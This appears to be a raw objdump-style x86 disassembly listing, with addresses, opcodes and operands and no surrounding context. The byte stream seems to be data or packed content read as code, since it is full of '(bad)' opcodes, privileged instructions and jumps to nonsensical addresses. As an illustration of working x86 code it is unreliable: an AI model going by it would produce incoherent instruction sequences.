  41672f:	cmp    BYTE PTR [eax+0x2d],0x1c
  416733:	repnz test eax,0xb1208c5a
  416739:	push   ebp
  41673a:	pop    es
  41673b:	test   al,0x83
  41673d:	fs fs dec ebp
  416740:	(bad)  
  416741:	retf   0x8a89
  416744:	loope  0x416701
  416746:	xchg   esp,eax
  416747:	and    al,0x3e
  416749:	xchg   edi,eax
  41674a:	in     eax,dx
  41674b:	into   
  41674c:	sti    
  41674d:	push   es
  41674e:	mov    cs,WORD PTR [edx]
  416750:	addr16 inc ebp
  416752:	dec    ecx
  416753:	lods   al,BYTE PTR ds:[esi]
  416754:	xor    edi,DWORD PTR [eax+eax*4+0x5be3e93c]
  41675b:	mov    bl,0xa2
  41675d:	push   ebp
  41675e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41675f:	pop    ebp
  416760:	inc    ebx
  416761:	(bad)  
  416763:	xchg   ebp,eax
  416764:	mov    al,0xee
  416766:	dec    edi
  416767:	outs   dx,DWORD PTR ds:[esi]
  416768:	pop    ss
  416769:	xchg   ecx,eax
  41676a:	clc    
  41676b:	sbb    DWORD PTR [eax+0x17],eax
  41676e:	aas    
  41676f:	fs pop ebp
  416771:	ret    0xae16
  416774:	mov    ebp,0xf4ff3637
  416779:	clc    
  41677a:	jno    0x4167d2
  41677c:	or     BYTE PTR [esi-0x35],al
  41677f:	test   eax,0xcfdb6e58
  416784:	sub    cl,dh
  416786:	(bad)  
  416787:	popa   
  416788:	cmp    BYTE PTR [ebp+eax*2-0x70953a1],dl
  41678f:	add    DWORD PTR [edx],0x967e1ab6
  416795:	or     BYTE PTR [ecx-0x4551b720],bl
  41679b:	jg     0x4167c8
  41679d:	icebp  
  41679e:	call   0xa5b0e241
  4167a3:	mov    bl,0x11
  4167a5:	cmp    ecx,edx
  4167a7:	aam    0xb5
  4167a9:	fisttp WORD PTR [eax]
  4167ab:	cmp    eax,0x90c1fea
  4167b0:	loop   0x41681f
  4167b2:	pusha  
  4167b3:	in     eax,dx
  4167b4:	imul   ebp,DWORD PTR [esi+0x3e2a70d6],0xde7a4135
  4167be:	pop    ebp
  4167bf:	ins    DWORD PTR es:[edi],dx
  4167c0:	pop    ebp
  4167c1:	(bad)  
  4167c2:	sahf   
  4167c3:	mov    bh,0x4a
  4167c5:	push   ebx
  4167c6:	std    
  4167c7:	xchg   esi,eax
  4167c8:	mov    ch,0x53
  4167ca:	mov    ebp,0x362e6e03
  4167cf:	sbb    ebp,ecx
  4167d1:	jp     0x416803
  4167d3:	mov    eax,0xa4b90316
  4167d8:	xchg   esi,eax
  4167d9:	clc    
  4167da:	(bad)  
  4167db:	stos   BYTE PTR es:[edi],al
  4167dc:	rcl    bh,cl
  4167de:	cmc    
  4167df:	out    0xfd,al
  4167e1:	mov    eax,edi
  4167e3:	fistp  WORD PTR ss:[ebx+edi*2]
  4167e7:	inc    eax
  4167e8:	add    ebx,DWORD PTR [edx+0x61ed9983]
  4167ee:	mov    ch,0x2e
  4167f0:	mov    eax,DWORD PTR [ebx-0x74]
  4167f3:	add    al,0xa5
  4167f5:	stc    
  4167f6:	into   
  4167f7:	and    DWORD PTR [ebx+0x55],eax
  4167fa:	lahf   
  4167fb:	bound  esp,QWORD PTR [eax-0x4e]
  4167fe:	inc    esp
  4167ff:	lock aaa 
  416801:	repnz mov ecx,0xc5c70381
  416807:	mov    ah,BYTE PTR [esi]
  416809:	push   ecx
  41680a:	pop    esp
  41680b:	sbb    DWORD PTR ds:0x56fd918d,esp
  416811:	cmp    ah,al
  416813:	aaa    
  416814:	jp     0x416893
  416816:	test   al,0xd0
  416818:	fild   DWORD PTR [edi-0x2e]
  41681b:	sbb    BYTE PTR [ecx],bh
  41681d:	ins    BYTE PTR es:[edi],dx
  41681e:	jl     0x4167d1
  416820:	pop    edi
  416821:	jo     0x416809
  416823:	je     0x416870
  416825:	jle    0x41687d
  416827:	push   0xffffffda
  416829:	and    esp,DWORD PTR [eax-0x27a07410]
  41682f:	jo     0x416818
  416831:	mov    di,0xdc0d
  416835:	call   0x275f5a6b
  41683a:	adc    ch,BYTE PTR [edi]
  41683c:	rcl    BYTE PTR [ebx+0x3a],cl
  41683f:	pop    es
  416840:	pop    esp
  416841:	dec    esi
  416842:	push   eax
  416843:	xchg   DWORD PTR [edx+0x1b],eax
  416846:	clc    
  416847:	jnp    0x416884
  416849:	push   ds
  41684a:	or     DWORD PTR [eax-0x19],ebp
  41684d:	rol    DWORD PTR [ecx],1
  41684f:	jns    0x4167ed
  416851:	inc    edx
  416852:	push   eax
  416853:	sbb    DWORD PTR [esi+edi*8+0x6a],ebx
  416857:	out    0x41,al
  416859:	popf   
  41685a:	stos   DWORD PTR es:[edi],eax
  41685b:	mov    ds:0xc127d3f5,al
  416860:	xchg   esp,eax
  416861:	lods   eax,DWORD PTR ds:[esi]
  416862:	nop
  416863:	loop   0x4168c6
  416865:	mov    ds:0x90457415,al
  41686a:	test   BYTE PTR [ebp-0x7a2bf0f1],ch
  416870:	push   ds
  416871:	mov    bl,0x61
  416873:	or     bh,BYTE PTR [edx+0x56]
  416876:	mov    ch,BYTE PTR [eax]
  416878:	hlt    
  416879:	or     BYTE PTR [eax+ecx*8-0x7b7c3223],ah
  416880:	dec    edx
  416881:	sub    BYTE PTR [edx+ebx*4],dl
  416884:	cmp    cl,BYTE PTR [edx+0x655dd6de]
  41688a:	loopne 0x41684c
  41688c:	mov    WORD PTR [edi],?
  41688e:	fist   WORD PTR [ebx-0x76fe5195]
  416894:	loope  0x4168d4
  416896:	pop    es
  416897:	(bad)  
  416898:	repnz xlat BYTE PTR ds:[ebx]
  41689a:	push   esp
  41689b:	stc    
  41689c:	arpl   sp,sp
  41689e:	rcl    DWORD PTR [eax],1
  4168a0:	cmp    edx,DWORD PTR [ecx-0x5f]
  4168a3:	inc    ecx
  4168a4:	aad    0xff
  4168a6:	dec    eax
  4168a7:	(bad)  
  4168a8:	int    0x1c
  4168aa:	sbb    edx,DWORD PTR [ebx]
  4168ac:	scas   eax,DWORD PTR es:[edi]
  4168ad:	jl     0x416840
  4168af:	test   eax,0x88695c91
  4168b4:	out    dx,eax
  4168b5:	lds    edi,FWORD PTR [ecx]
  4168b7:	inc    eax
  4168b8:	(bad)  
  4168b9:	jb     0x416900
  4168bb:	add    ch,BYTE PTR [eax+ebp*8]
  4168be:	bound  ecx,QWORD PTR [esi-0x1a]
  4168c1:	xor    BYTE PTR [edi-0x63],bh
  4168c4:	stos   DWORD PTR es:[edi],eax
  4168c5:	adc    esp,DWORD PTR [ebx]
  4168c7:	fbld   TBYTE PTR [esi+0x7ec83c07]
  4168cd:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168cf:	es addr16 cmc 
  4168d2:	test   al,0xa2
  4168d4:	and    eax,0x89c38b91
  4168d9:	and    bl,dh
  4168db:	push   cs
  4168dc:	scas   eax,DWORD PTR es:[edi]
  4168dd:	sbb    DWORD PTR [edx+ebx*2],ebp
  4168e0:	inc    edx
  4168e1:	es ds xor dh,0x3f
  4168e6:	xor    eax,0xd9c4d898
  4168eb:	xlat   BYTE PTR ds:[ebx]
  4168ec:	mov    esi,0xf525d689
  4168f1:	inc    esp
  4168f2:	xchg   edi,eax
  4168f3:	and    DWORD PTR [ebx+0x3c],edi
  4168f6:	fbld   TBYTE PTR [esp+eax*8-0x33]
  4168fa:	shr    DWORD PTR [ebp+ebp*8-0x22],cl
  4168fe:	sub    BYTE PTR [ebp-0x1a],al
  416901:	es sub bl,ch
  416904:	and    DWORD PTR [ebx-0x23bb190c],ebp
  41690a:	(bad)  
  41690b:	es sbb ebp,ecx
  41690e:	outs   dx,DWORD PTR ds:[esi]
  41690f:	dec    edx
  416910:	xor    eax,0x196fd34b
  416915:	pop    eax
  416916:	(bad)  
  416917:	leave  
  416918:	scas   eax,DWORD PTR es:[edi]
  416919:	add    esp,DWORD PTR [edi]
  41691b:	in     eax,0x7d
  41691d:	repnz fwait
  41691f:	sub    esi,DWORD PTR [ecx]
  416921:	or     BYTE PTR [eax-0xea57c7f],dl
  416927:	xor    esp,DWORD PTR [eax+0x505f5c03]
  41692d:	xchg   DWORD PTR [ebx+0x69],ebx
  416930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416931:	call   0xcbf5997a
  416936:	xchg   BYTE PTR [ebx-0x4c],bh
  416939:	retf   
  41693a:	mov    ds:0xf33b599d,eax
  41693f:	test   eax,0xd89310ba
  416944:	fimul  WORD PTR [ebp+0x56]
  416947:	push   ds
  416948:	push   ds
  416949:	shr    BYTE PTR [ebp+ebp*2+0x14357c5d],1
  416950:	mov    ebp,0xc80c8d55
  416955:	lea    edi,[eax]
  416957:	inc    ecx
  416958:	mov    WORD PTR [eax-0x90c3b5a],fs
  41695e:	daa    
  41695f:	mov    al,0xc2
  416961:	xchg   esp,eax
  416962:	lock xchg esi,eax
  416964:	jecxz  0x4169a5
  416966:	sub    al,0xfb
  416968:	or     bl,BYTE PTR [ecx+0xd]
  41696b:	(bad)  
  41696c:	shl    DWORD PTR [esi-0xdb5740b],1
  416972:	sub    al,0x46
  416974:	inc    eax
  416975:	mov    bl,0x69
  416977:	scas   eax,DWORD PTR es:[edi]
  416978:	add    dl,dh
  41697a:	mov    ecx,0xfeef55c
  41697f:	xor    al,bh
  416981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416982:	ja     0x416957
  416984:	sub    BYTE PTR [ebp+0x40837ed5],dh
  41698a:	mov    ah,0xdd
  41698c:	add    edi,DWORD PTR [edx]
  41698e:	bound  ecx,QWORD PTR [ecx+edi*2]
  416991:	xor    eax,ecx
  416993:	pop    ds
  416994:	cmc    
  416995:	mul    BYTE PTR [edi]
  416997:	shl    DWORD PTR [edx+0x6e6a85fc],0xd
  41699e:	mov    ch,0x4e
  4169a0:	iret   
  4169a1:	cmp    al,0xe6
  4169a3:	add    BYTE PTR ds:0x84d2ca90,0xb3
  4169aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ab:	push   edx
  4169ac:	adc    edx,eax
  4169ae:	and    al,0xb8
  4169b0:	dec    esp
  4169b1:	hlt    
  4169b2:	iret   
  4169b3:	imul   ebp,DWORD PTR [eax+0x59],0xc05a722d
  4169ba:	rol    ecx,cl
  4169bc:	in     al,0xad
  4169be:	jns    0x4169db
  4169c0:	inc    BYTE PTR [edi]
  4169c2:	leave  
  4169c3:	or     eax,0x6104da6d
  4169c8:	(bad)  
  4169c9:	enter  0xc1d7,0x60
  4169cd:	pusha  
  4169ce:	mov    ds:0xaa19f8b7,al
  4169d3:	sub    eax,0xd8a4c8e9
  4169d8:	and    al,0xe4
  4169da:	fist   WORD PTR [edx-0x47ec8bdd]
  4169e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e1:	icebp  
  4169e2:	es cld 
  4169e4:	push   ecx
  4169e5:	inc    esp
  4169e6:	pop    ecx
  4169e7:	sbb    eax,ecx
  4169e9:	lods   ax,WORD PTR ss:[esi]
  4169ec:	jo     0x4169dd
  4169ee:	push   es
  4169ef:	mov    ebx,0x77cba634
  4169f4:	cmp    al,0x29
  4169f6:	xchg   DWORD PTR [ebp+0x4a],ecx
  4169f9:	jb     0x416a15
  4169fb:	or     BYTE PTR [ebx],cl
  4169fd:	jle    0x416a31
  4169ff:	js     0x416983
  416a01:	cmp    eax,0x64f69cf6
  416a06:	xor    DWORD PTR [ecx],0xffffffc5
  416a09:	adc    ah,BYTE PTR [eax-0x18bfb863]
  416a0f:	mov    ebx,0x59ac1319
  416a14:	fcmovne st,st(2)
  416a16:	sbb    bh,BYTE PTR [esi]
  416a18:	jne    0x4169f0
  416a1a:	mov    ds:0xe5b7734e,al
  416a1f:	dec    esi
  416a20:	pop    esi
  416a21:	pop    ss
  416a22:	mov    ds:0x35a79776,eax
  416a27:	xor    BYTE PTR [edx+0x1e],ch
  416a2a:	fwait
  416a2b:	outs   dx,BYTE PTR ds:[esi]
  416a2c:	dec    esi
  416a2d:	dec    ecx
  416a2e:	jno    0x416aa4
  416a30:	loop   0x4169e3
  416a32:	fwait
  416a33:	(bad)  
  416a34:	rol    BYTE PTR [esi-0x6],cl
  416a37:	xor    al,0xc1
  416a39:	js     0x416a83
  416a3b:	retf   
  416a3c:	sahf   
  416a3d:	test   BYTE PTR [ebp-0x54],dh
  416a40:	inc    eax
  416a41:	cmp    al,0xc2
  416a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a44:	cmp    DWORD PTR [eax-0x12],esp
  416a47:	ret    
  416a48:	pushf  
  416a49:	mov    ebx,0xf36ec80c
  416a4e:	mov    bh,0x6a
  416a50:	pop    ebp
  416a51:	mov    al,0xf3
  416a53:	jp     0x416a9d
  416a55:	in     eax,dx
  416a56:	sbb    al,0xcb
  416a58:	sar    bh,1
  416a5a:	shr    ebp,cl
  416a5c:	or     DWORD PTR [esi+0x6fa3ba5a],edx
  416a62:	(bad)  
  416a63:	jno    0x416a73
  416a65:	inc    edx
  416a66:	or     ebx,0x1f
  416a69:	frstor [ecx+eiz*8+0x6c]
  416a6d:	fst    DWORD PTR [edx+0x283cf28c]
  416a73:	add    ebp,ecx
  416a75:	xchg   ebx,eax
  416a76:	aas    
  416a77:	jl     0x416a5c
  416a79:	mov    esp,0xd3f4ecaf
  416a7e:	sbb    bh,BYTE PTR gs:[edx+0x1a]
  416a82:	in     eax,0x35
  416a84:	inc    ecx
  416a85:	inc    ebp
  416a86:	dec    esi
  416a87:	jp     0x416a1b
  416a89:	rcr    ecx,cl
  416a8b:	fdiv   DWORD PTR [ecx+0x2d]
  416a8e:	jmp    0x8d236e83
  416a93:	push   edi
  416a94:	fdiv   DWORD PTR [ecx-0x77719e41]
  416a9a:	or     eax,0x32b15b2d
  416a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aa0:	mov    bh,BYTE PTR [esi]
  416aa2:	rcl    DWORD PTR [ecx],cl
  416aa4:	cmp    BYTE PTR [eax+0x623fa0f3],0x66
  416aab:	or     al,BYTE PTR [edx]
  416aad:	hlt    
  416aae:	fcmovnb st,st(5)
  416ab0:	push   esi
  416ab1:	punpckhdq mm6,QWORD PTR [esi-0x49]
  416ab5:	sbb    DWORD PTR [eax+0x27feeaba],0xffffffe6
  416abc:	sar    DWORD PTR [edx],1
  416abe:	adc    esi,0xffffffb4
  416ac1:	xor    dl,ah
  416ac3:	std    
  416ac4:	je     0x33cac83
  416aca:	xchg   BYTE PTR [edx-0x3a1b5c4c],al
  416ad0:	push   es
  416ad1:	xchg   ebp,eax
  416ad2:	test   BYTE PTR [edx+0x55],al
  416ad5:	cdq    
  416ad6:	push   edi
  416ad7:	mov    ds:0xa9f6ea77,al
  416adc:	sbb    al,BYTE PTR [ecx]
  416ade:	call   0xbc3d:0xd1366ca2
  416ae5:	pop    ebx
  416ae6:	les    ebx,FWORD PTR [ebx+0x7057baf8]
  416aec:	(bad)  
  416aed:	aam    0x97
  416aef:	jae    0x416b49
  416af1:	bound  esi,QWORD PTR [ebx-0x46]
  416af4:	add    edi,edx
  416af6:	mov    al,0x80
  416af8:	mov    eax,0xb5b327c0
  416afd:	cvtpi2ps xmm6,QWORD PTR [edx-0x5a]
  416b01:	rol    DWORD PTR [esi+0x52c15f27],0x14
  416b08:	fld    DWORD PTR [ebp+0x7c688864]
  416b0e:	sbb    ah,BYTE PTR [esi+0x20f364e4]
  416b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b15:	stos   BYTE PTR es:[edi],al
  416b16:	out    0xc0,eax
  416b18:	leave  
  416b19:	aaa    
  416b1a:	sahf   
  416b1b:	pop    ss
  416b1c:	(bad)  
  416b1d:	test   eax,0x3ff21e2e
  416b22:	mov    dh,0x46
  416b24:	mov    dh,0xae
  416b26:	adc    al,BYTE PTR [eax-0x52185a34]
  416b2c:	cs push ecx
  416b2e:	mov    BYTE PTR [esi+0x6e],ch
  416b31:	push   esp
  416b32:	daa    
  416b33:	ret    
  416b34:	inc    esi
  416b35:	retf   
  416b36:	neg    bl
  416b38:	pop    esp
  416b39:	ins    BYTE PTR es:[edi],dx
  416b3a:	test   al,0x37
  416b3c:	call   0x2dc47204
  416b41:	or     DWORD PTR [edx-0x77ac2eee],eax
  416b47:	push   edx
  416b48:	jb     0x416afa
  416b4a:	pop    ebp
  416b4b:	xor    al,0x42
  416b4d:	push   eax
  416b4e:	push   esp
  416b4f:	and    ecx,DWORD PTR [ebp-0x73]
  416b52:	in     al,dx
  416b53:	xor    BYTE PTR [esp+eiz*2-0x20],0x70
  416b58:	inc    edx
  416b59:	js     0x416b2e
  416b5b:	(bad)  
  416b5d:	hlt    
  416b5e:	mov    ds:0x5da74cff,al
  416b63:	push   esi
  416b64:	pop    edx
  416b65:	sub    BYTE PTR [ecx],ah
  416b67:	ins    DWORD PTR es:[edi],dx
  416b68:	add    eax,0x24e95a5d
  416b6d:	test   al,0xb8
  416b6f:	fsub   DWORD PTR ds:0xecdf74e6
  416b75:	xchg   edi,eax
  416b76:	mov    esp,0x5f56578d
  416b7b:	loopne 0x416b38
  416b7d:	fs mov ah,0x82
  416b80:	imul   ecx
  416b82:	add    bh,ah
  416b84:	das    
  416b85:	fld    DWORD PTR ds:0x820ebe6e
  416b8b:	(bad)  
  416b8c:	sbb    ah,cl
  416b8e:	cmp    DWORD PTR [esi-0xb],edi
  416b91:	mov    dl,0xf4
  416b93:	loope  0x416bb1
  416b95:	sub    DWORD PTR ds:0x626d544b,0x6d
  416b9c:	ja     0x416be1
  416b9e:	fnstcw WORD PTR [eax-0x30]
  416ba1:	or     ch,dh
  416ba3:	mov    ds:0x671af03d,eax
  416ba8:	mov    edx,0x7fd82aea
  416bad:	cmp    BYTE PTR [eax+0x508f4ef0],0x9f
  416bb4:	lock lods al,BYTE PTR ds:[esi]
  416bb6:	dec    ecx
  416bb7:	stc    
  416bb8:	daa    
  416bb9:	enter  0x11dd,0x56
  416bbd:	xchg   ebx,eax
  416bbe:	mov    dh,0x7
  416bc0:	cmp    bh,BYTE PTR [ebx+0x3e80de81]
  416bc6:	(bad)  
  416bc7:	mov    BYTE PTR [esi+0x3b],bl
  416bca:	pop    esp
  416bcb:	jmp    0x805c82f9
  416bd0:	pop    ss
  416bd1:	icebp  
  416bd2:	jno    0x416c51
  416bd4:	ret    
  416bd5:	sahf   
  416bd6:	outs   dx,BYTE PTR ds:[esi]
  416bd7:	sti    
  416bd8:	fwait
  416bd9:	pop    es
  416bda:	jno    0x416bca
  416bdc:	adc    BYTE PTR [edi+0x38],ch
  416bdf:	push   0xc175fcef
  416be4:	jbe    0x416c1d
  416be6:	mov    esi,0x21cc0916
  416beb:	jbe    0x416b9c
  416bed:	push   ebx
  416bee:	fmul   QWORD PTR [eax-0x3dbcf26c]
  416bf4:	pop    ebp
  416bf5:	sbb    ebp,esp
  416bf7:	loop   0x416bec
  416bf9:	or     al,0x96
  416bfb:	in     eax,0x68
  416bfd:	pushf  
  416bfe:	and    al,0xc9
  416c00:	addr16 xor ecx,0x309165ec
  416c07:	rol    ch,cl
  416c09:	inc    ecx
  416c0a:	fdiv   QWORD PTR [edx-0x50]
  416c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c0e:	icebp  
  416c0f:	sbb    al,0xaf
  416c11:	mov    ebx,0x6fbb1a95
  416c16:	xchg   esi,eax
  416c17:	cmp    eax,0x20da834f
  416c1c:	mov    ecx,0x72b2a154
  416c21:	and    al,0x55
  416c23:	xchg   esi,eax
  416c24:	xor    al,0xec
  416c26:	push   ebp
  416c27:	push   edi
  416c28:	and    al,0x74
  416c2a:	or     cl,BYTE PTR ds:0xe9bf881a
  416c30:	mov    ecx,ebp
  416c32:	jns    0x416c4c
  416c34:	add    eax,0x7636cbfb
  416c39:	sti    
  416c3a:	fisttp DWORD PTR ds:0xe80e6f5d
  416c40:	cmp    bl,BYTE PTR [edi+0x63]
  416c43:	add    esi,esi
  416c45:	mov    edx,ebp
  416c47:	inc    eax
  416c48:	inc    esi
  416c49:	jbe    0x416c11
  416c4b:	and    BYTE PTR [edx],ch
  416c4d:	push   ds
  416c4e:	mov    dh,0x69
  416c50:	mov    dh,0x2c
  416c52:	(bad)  
  416c53:	imul   BYTE PTR [edx+ebp*1]
  416c56:	ins    BYTE PTR es:[edi],dx
  416c57:	gs jb  0x416c5a
  416c5a:	ror    ecx,0x43
  416c5d:	sub    dl,cl
  416c5f:	dec    ebx
  416c60:	pushf  
  416c61:	jmp    0xc88341b6
  416c66:	jge    0x416cc8
  416c68:	movlps xmm5,QWORD PTR [eax]
  416c6b:	ins    BYTE PTR es:[edi],dx
  416c6c:	push   0x70
  416c6e:	and    DWORD PTR [edx+edi*2+0x50],esi
  416c72:	cdq    
  416c73:	xchg   ecx,eax
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	xchg   ecx,eax
  416c76:	pop    ss
  416c77:	xchg   esp,eax
  416c78:	into   
  416c79:	xor    bh,BYTE PTR [ebx+0x17]
  416c7c:	adc    al,0xdb
  416c7e:	mov    eax,ds:0xfea0a74d
  416c83:	bound  ebp,QWORD PTR [edi+0x63]
  416c86:	fs jbe 0x416c6a
  416c89:	adc    eax,0x4201bc93
  416c8e:	dec    ebp
  416c8f:	in     eax,dx
  416c90:	in     al,0x29
  416c92:	bound  ebp,QWORD PTR [ebx-0x59470952]
  416c98:	and    dl,BYTE PTR [edi-0x55d0f58b]
  416c9e:	aam    0x83
  416ca0:	pop    edx
  416ca1:	fs es pop ds
  416ca4:	cdq    
  416ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ca6:	in     eax,dx
  416ca7:	pop    ss
  416ca8:	or     al,0x3d
  416caa:	or     BYTE PTR [eax+ebx*1+0x61c4edff],cl
  416cb1:	stc    
  416cb2:	iret   
  416cb3:	inc    ecx
  416cb4:	dec    eax
  416cb5:	aas    
  416cb6:	mov    dl,0xb7
  416cb8:	xor    al,0x6b
  416cba:	push   esp
  416cbb:	ret    
  416cbc:	xor    al,0xe1
  416cbe:	adc    ebp,DWORD PTR ds:0xeae9596a
  416cc4:	mov    edi,DWORD PTR [ebx-0x78a622a]
  416cca:	ror    DWORD PTR [edi+0x6e220fc0],1
  416cd0:	loope  0x416c7d
  416cd2:	jmp    0x103373d3
  416cd7:	jge    0x416d4d
  416cd9:	pop    es
  416cda:	mov    bh,0x58
  416cdc:	inc    esp
  416cdd:	xchg   edi,eax
  416cde:	cmp    DWORD PTR [edi+0x1],ecx
  416ce1:	dec    ecx
  416ce2:	mov    cl,0x6c
  416ce4:	dec    ebx
  416ce5:	mov    dl,0x83
  416ce7:	jnp    0x416c8a
  416ce9:	iret   
  416cea:	mov    esp,0x5a77f63a
  416cef:	scas   al,BYTE PTR es:[edi]
  416cf0:	xchg   BYTE PTR [ecx+0x3e],bh
  416cf3:	leave  
  416cf4:	(bad)  
  416cf5:	call   0x67ddc710
  416cfa:	jle    0x416d35
  416cfc:	push   esi
  416cfd:	sahf   
  416cfe:	mov    dh,0xf8
  416d00:	mov    eax,ds:0xd732298b
  416d05:	jns    0x416d01
  416d07:	mov    eax,0x161be397
  416d0c:	jg     0x416cac
  416d0e:	xlat   BYTE PTR ds:[ebx]
  416d0f:	inc    ebp
  416d10:	ins    BYTE PTR es:[edi],dx
  416d11:	in     eax,0x43
  416d13:	push   edi
  416d14:	je     0x416caf
  416d16:	std    
  416d17:	add    al,0x1f
  416d19:	push   0xffffffdc
  416d1b:	inc    ebp
  416d1c:	push   ebp
  416d1d:	leave  
  416d1e:	test   DWORD PTR [edx-0x56],esp
  416d21:	test   al,0xe8
  416d23:	jmpw   0xfa9c
  416d27:	pop    edx
  416d28:	sbb    edx,DWORD PTR [ebx+ebp*1-0x77]
  416d2c:	test   dl,bl
  416d2e:	retf   0xf78c
  416d31:	fwait
  416d32:	adc    eax,DWORD PTR [ebx+0x74b83949]
  416d38:	jp     0x416d27
  416d3a:	arpl   di,sp
  416d3c:	test   ebp,0x12be2d32
  416d42:	popf   
  416d43:	fist   WORD PTR [ecx-0x44]
  416d46:	pop    esi
  416d47:	fcmovu st,st(3)
  416d49:	pusha  
  416d4a:	and    cl,cl
  416d4c:	pop    es
  416d4d:	mov    al,BYTE PTR [ebp-0x76]
  416d50:	mov    ebp,0x185fae18
  416d55:	je     0x416d54
  416d57:	into   
  416d58:	shr    DWORD PTR [esi+0x2d0fb67],cl
  416d5e:	add    DWORD PTR [esp+esi*4-0xb],eax
  416d62:	pop    eax
  416d63:	loopne 0x416da6
  416d65:	cmp    ah,BYTE PTR [ecx+eax*8+0x1f]
  416d69:	lods   eax,DWORD PTR ds:[esi]
  416d6a:	das    
  416d6b:	out    0x2d,eax
  416d6d:	jl     0x416dd6
  416d6f:	dec    esp
  416d70:	inc    esi
  416d71:	adc    DWORD PTR [edx-0x6b],esi
  416d74:	mov    ecx,0x79ef4aa3
  416d79:	xchg   esi,eax
  416d7a:	jne    0x416dd0
  416d7c:	outs   dx,BYTE PTR ds:[esi]
  416d7d:	push   0x15
  416d7f:	and    eax,0xa6672eaf
  416d84:	aad    0xc3
  416d86:	pop    edi
  416d87:	push   ebx
  416d88:	push   edi
  416d89:	in     al,dx
  416d8a:	pop    ebp
  416d8b:	xchg   BYTE PTR [ecx],ah
  416d8d:	jmp    0xdb45:0x95e928f9
  416d94:	outs   dx,DWORD PTR ds:[esi]
  416d95:	lods   eax,DWORD PTR ds:[esi]
  416d96:	cdq    
  416d97:	or     al,0x4
  416d99:	jge    0x416d93
  416d9b:	call   0x9629:0xdd061eb6
  416da2:	outs   dx,DWORD PTR ds:[esi]
  416da3:	or     ebp,DWORD PTR [esi]
  416da5:	aas    
  416da6:	dec    eax
  416da7:	dec    ebp
  416da8:	pop    eax
  416da9:	sub    dh,ah
  416dab:	fild   WORD PTR [esi-0x49]
  416dae:	sbb    BYTE PTR [ecx+0x4f],dh
  416db1:	xchg   esp,ebp
  416db3:	mov    ah,0x8d
  416db5:	retf   0x8c40
  416db8:	cs adc dl,dh
  416dbb:	inc    edi
  416dbc:	cmp    BYTE PTR [edx-0x6fbbc2e1],dh
  416dc2:	and    DWORD PTR [ebp-0x8d654e7],0xf82cb17c
  416dcc:	or     edx,edi
  416dce:	sub    edi,ebp
  416dd0:	sbb    ecx,ebx
  416dd2:	mov    edx,0x8932a79d
  416dd7:	mov    eax,0x8bb42074
  416ddc:	int3   
  416ddd:	dec    ecx
  416dde:	mov    cl,0xa3
  416de0:	pop    ebx
  416de1:	retf   0x8dd8
  416de4:	test   DWORD PTR [ecx-0x6d501323],esp
  416dea:	cmp    DWORD PTR [ecx+0x7cc74378],eax
  416df0:	xor    bl,BYTE PTR [ebp+0x152aed5b]
  416df6:	call   0x3ecf:0xb329ecc4
  416dfd:	push   es
  416dfe:	push   ebp
  416dff:	popf   
  416e00:	pop    eax
  416e01:	mov    dl,BYTE PTR [eax-0x6f]
  416e04:	mov    al,0x9a
  416e06:	popf   
  416e07:	mov    ebp,0x94ab2824
  416e0c:	sub    esi,DWORD PTR [eax-0x456084d7]
  416e12:	add    ah,bl
  416e14:	sahf   
  416e15:	sahf   
  416e16:	out    dx,al
  416e17:	stc    
  416e18:	push   cs
  416e19:	sub    al,0xa1
  416e1b:	xchg   DWORD PTR [esi+0x1c00091c],edx
  416e21:	sub    BYTE PTR [eax-0x77],dl
  416e24:	cdq    
  416e25:	pusha  
  416e26:	inc    eax
  416e27:	test   BYTE PTR [edi],cl
  416e29:	add    al,0x2d
  416e2b:	inc    edx
  416e2c:	pop    ecx
  416e2d:	mov    DWORD PTR [ecx],esp
  416e2f:	mov    BYTE PTR [esi-0x79],cl
  416e32:	mov    bh,0xcc
  416e34:	push   cs
  416e35:	in     al,dx
  416e36:	cli    
  416e37:	lds    eax,FWORD PTR [ebx-0x7ef96517]
  416e3d:	sub    bl,bl
  416e3f:	inc    ebx
  416e40:	jge    0x416ec0
  416e42:	pop    ebp
  416e43:	in     eax,dx
  416e44:	xor    al,0xd3
  416e46:	sub    dl,cl
  416e48:	std    
  416e49:	fwait
  416e4a:	mov    al,0x15
  416e4c:	inc    ebp
  416e4d:	in     eax,dx
  416e4e:	into   
  416e4f:	das    
  416e50:	cmp    BYTE PTR [edx+0x2fca629c],cl
  416e56:	jcxz   0x416e1b
  416e59:	xchg   ecx,eax
  416e5a:	das    
  416e5b:	lahf   
  416e5c:	cmp    eax,0x4ddc6fec
  416e61:	pop    ds
  416e62:	pop    ecx
  416e63:	and    BYTE PTR [eax+0xe],ah
  416e66:	add    DWORD PTR [eax-0x14c2f24a],esi
  416e6c:	push   esp
  416e6d:	ss adc dh,ch
  416e70:	push   ds
  416e71:	jl     0x416eb2
  416e73:	and    BYTE PTR [esi-0x4f251761],al
  416e79:	int    0x69
  416e7b:	dec    ebp
  416e7c:	fistp  DWORD PTR [ecx+ebx*2+0x1e]
  416e80:	mov    al,ds:0x92dd14d1
  416e85:	and    cl,bl
  416e87:	sub    DWORD PTR [esi-0x67],edi
  416e8a:	cmp    DWORD PTR [ebx+ebx*4+0x48adae04],0xffffff82
  416e92:	and    ah,dl
  416e94:	xlat   BYTE PTR ds:[ebx]
  416e95:	ror    ebx,0xb3
  416e98:	idiv   BYTE PTR [edi]
  416e9a:	inc    esp
  416e9b:	mov    ecx,0x5233b612
  416ea0:	jbe    0x416ea2
  416ea2:	jbe    0x416e9e
  416ea4:	mov    ds:0x47f8ac77,eax
  416ea9:	stos   DWORD PTR es:[edi],eax
  416eaa:	jecxz  0x416e49
  416eac:	(bad)  
  416ead:	rcl    BYTE PTR ds:0x53e04f6c,cl
  416eb3:	gs stos BYTE PTR es:[edi],al
  416eb5:	jmp    0x62ebca5d
